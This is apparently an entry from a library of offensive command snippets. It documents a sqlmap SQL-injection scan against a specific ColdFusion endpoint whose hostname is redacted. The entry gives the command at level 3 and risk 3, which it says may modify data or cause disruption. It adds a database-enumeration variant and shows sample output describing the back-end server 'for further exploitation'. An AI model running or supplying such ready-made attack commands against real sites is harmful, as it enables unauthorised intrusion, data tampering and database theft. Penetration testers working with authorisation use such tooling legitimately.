---
data: >-
  python sqlmap.py -u https://www.██████████/public/saveCount.cfm?countID=4
  --level=3 --risk=3
tags:
  - sql-injection
  - sqli
  - detection
type: command
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
id: dd3ab9be-ad47-4217-b1d1-c4ef0abe065d
created_at: '2025-12-14T03:15:05.015Z'
updated_at: '2025-12-14T03:15:05.015Z'
verified: false
validated: true
submitted: true
---
# sqlmap-detect-sqli-high-risk

## Command

```bash
python sqlmap.py -u https://www.██████████/public/saveCount.cfm?countID=4 --level=3 --risk=3
```

## Description

This command uses sqlmap to test a specific web endpoint for SQL Injection vulnerabilities in the countID parameter, employing high detection levels and risk settings to thoroughly probe for injectable points and retrieve backend database information.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Specifies the target URL to test for vulnerabilities | Yes |
| `--level=3` | Sets the testing level to 3 (out of 5), including more injection techniques and headers | Yes |
| `--risk=3` | Sets the risk level to 3 (out of 3), allowing payloads that may modify data or cause disruptions | Yes |

## Examples

### Basic Usage

```bash
python sqlmap.py -u "https://example.com/page?id=1" --level=1 --risk=1
```

### Advanced Usage

```bash
python sqlmap.py -u "https://www.██████████/public/saveCount.cfm?countID=4" --level=3 --risk=3 --batch --dbs
```

This advanced example adds --batch for non-interactive mode and --dbs to enumerate databases post-detection.

## Expected Output

Upon successful detection, sqlmap outputs details like:

```
[INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows NT 6.3
web application technology: ColdFusion
back-end DBMS: Microsoft SQL Server 2008 R2 (SP3)
banner: 'Microsoft SQL Server 2008 R2 (SP3) - 10.50.6220.0 (X64) ...'
```

This confirms the vulnerability and provides server details for further exploitation.

## Related

- [[Related Procedure: Detect-and-Confirm-SQL-Injection-with-sqlmap]]
